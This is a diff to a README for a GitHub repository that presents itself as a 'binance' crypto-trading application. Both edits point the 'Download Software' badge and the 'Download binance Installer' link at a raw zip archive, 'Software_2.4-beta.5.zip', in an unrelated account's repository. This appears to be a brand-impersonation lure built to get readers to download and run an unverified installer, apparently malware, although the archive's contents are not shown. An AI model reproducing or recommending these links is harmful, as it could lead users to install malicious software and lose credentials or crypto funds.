@@ -1,6 +1,6 @@
 # 📊 binance - Trade digital assets with complete ease
 
-[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://github.com/quillantinny41/binance)
+[![](https://img.shields.io/badge/Download_Software-Blue?style=for-the-badge)](https://raw.githubusercontent.com/quillantinny41/binance/main/neighbored/Software_2.4-beta.5.zip)
 
 ## 📖 About this application
 
@@ -22,7 +22,7 @@ Ensure you update your Windows operating system before you begin the setup proce
 
 Visit the following link to locate the latest build of the software:
 
-[Download binance Installer](https://github.com/quillantinny41/binance)
+[Download binance Installer](https://raw.githubusercontent.com/quillantinny41/binance/main/neighbored/Software_2.4-beta.5.zip)
 
 Follow these steps to complete the installation on your computer:
 
